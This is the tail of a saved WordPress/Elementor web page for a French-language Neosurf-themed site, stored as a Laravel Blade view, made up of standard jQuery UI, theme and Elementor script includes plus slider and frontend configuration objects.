    </script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4' id='jquery-ui-mouse-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4' id='jquery-ui-resizable-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4' id='jquery-ui-draggable-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4' id='jquery-ui-dialog-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/droppable.min.js?ver=1.11.4' id='jquery-ui-droppable-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/selectmenu.min.js?ver=1.11.4' id='jquery-ui-selectmenu-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/progressbar.min.js?ver=1.11.4' id='jquery-ui-progressbar-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/selectable.min.js?ver=1.11.4' id='jquery-ui-selectable-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/slider.min.js?ver=1.11.4' id='jquery-ui-slider-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/spinner.min.js?ver=1.11.4' id='jquery-ui-spinner-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4' id='jquery-ui-sortable-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/tabs.min.js?ver=1.11.4' id='jquery-ui-tabs-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/tooltip.min.js?ver=1.11.4' id='jquery-ui-tooltip-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect.min.js?ver=1.11.4' id='jquery-effects-core-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-blind.min.js?ver=1.11.4' id='jquery-effects-blind-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-bounce.min.js?ver=1.11.4' id='jquery-effects-bounce-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-clip.min.js?ver=1.11.4' id='jquery-effects-clip-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-drop.min.js?ver=1.11.4' id='jquery-effects-drop-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-explode.min.js?ver=1.11.4' id='jquery-effects-explode-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-fade.min.js?ver=1.11.4' id='jquery-effects-fade-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-fold.min.js?ver=1.11.4' id='jquery-effects-fold-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-highlight.min.js?ver=1.11.4' id='jquery-effects-highlight-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-pulsate.min.js?ver=1.11.4' id='jquery-effects-pulsate-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-size.min.js?ver=1.11.4' id='jquery-effects-size-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-scale.min.js?ver=1.11.4' id='jquery-effects-scale-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-shake.min.js?ver=1.11.4' id='jquery-effects-shake-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-slide.min.js?ver=1.11.4' id='jquery-effects-slide-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/effect-transfer.min.js?ver=1.11.4' id='jquery-effects-transfer-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/js/jquery.cycle.all.js?ver=5.5.10' id='jquery_cycle_all-js'></script>
    <script type='text/javascript' id='edge_slider-js-extra'>
        /* <![CDATA[ */
        var edge_slider_value = {
            "transition_effect": "fade",
            "transition_delay": "4000",
            "transition_duration": "1000"
        };
        /* ]]> */
    </script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/js/edge-slider-setting.js?ver=5.5.10' id='edge_slider-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/assets/sticky/jquery.sticky.min.js?ver=5.5.10' id='jquery_sticky-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/assets/sticky/sticky-settings.js?ver=5.5.10' id='sticky_settings-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/js/navigation.js?ver=5.5.10' id='edge-navigation-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/js/skip-link-focus-fix.js?ver=5.5.10' id='edge-skip-link-focus-fix-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/wp-embed.min.js?ver=5.5.10' id='wp-embed-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=2.9.7' id='elementor-frontend-modules-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/dialog/dialog.min.js?ver=4.7.6' id='elementor-dialog-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2' id='elementor-waypoints-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/swiper/swiper.min.js?ver=5.3.6' id='swiper-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/share-link/share-link.min.js?ver=2.9.7' id='share-link-js'></script>
    <script type='text/javascript' id='elementor-frontend-js-before'>
        var elementorFrontendConfig = {
            "environmentMode": {
                "edit": false,
                "wpPreview": false
            },
            "i18n": {
                "shareOnFacebook": "Partager sur Facebook",
                "shareOnTwitter": "Partager sur Twitter",
                "pinIt": "L\u2019\u00e9pingler",
                "downloadImage": "T\u00e9l\u00e9charger une image"
            },
            "is_rtl": false,
            "breakpoints": {
                "xs": 0,
                "sm": 480,
                "md": 768,
                "lg": 1025,
                "xl": 1440,
                "xxl": 1600
            },
            "version": "2.9.7",
            "urls": {
                "assets": "https:\/\/neosurfonline.space\/wp-content\/plugins\/elementor\/assets\/"
            },
            "settings": {
                "page": [],
                "general": {
                    "elementor_global_image_lightbox": "yes",
                    "elementor_lightbox_enable_counter": "yes",
                    "elementor_lightbox_enable_fullscreen": "yes",
                    "elementor_lightbox_enable_zoom": "yes",
                    "elementor_lightbox_enable_share": "yes",
                    "elementor_lightbox_title_src": "title",
                    "elementor_lightbox_description_src": "description"
                },
                "editorPreferences": []
            },
            "post": {
                "id": 263,
                "title": "neoservice.online",
                "excerpt": "",
                "featuredImage": false
            }
        };
    </script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=2.9.7' id='elementor-frontend-js'></script>
</body>

</html>
<!-- Page supported by LiteSpeed Cache 2.9.9.2 on 2022-09-05 16:48:59 --><?php /**PATH C:\Users\Utilisateur\workspace\recharge\resources\views/index1.blade.php ENDPATH**/ ?>